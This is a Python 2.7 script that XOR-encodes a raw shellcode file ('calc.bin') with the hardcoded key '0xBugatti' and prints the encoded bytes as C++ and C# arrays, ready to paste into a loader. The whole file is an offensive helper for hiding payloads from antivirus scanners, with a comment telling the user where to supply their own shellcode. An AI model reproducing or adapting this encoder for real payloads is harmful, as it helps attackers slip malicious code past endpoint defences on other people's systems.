#Python 2.7
import sys

KEY = "0xBugatti"


def xor(data, key):
    key = str(key)
    l = len(key)
    output_str = ""
    for i in range(len(data)):
        current = data[i]
        current_key = key[i % len(key)]
        output_str += chr(ord(current) ^ ord(current_key))

    return output_str


def printCiphertext(ciphertext):
    print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')


#ShellCode (file.bin) Path Here
plaintext = open("calc.bin", "rb").read()
ciphertext = xor(plaintext, KEY)
print('Key is: ' + KEY)

print("C++ Format: \n unsigned char ShellCode[]=" )
printCiphertext(ciphertext)
print("C# Format: \n Byte ShellCode[]=")
printCiphertext(ciphertext)

#print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
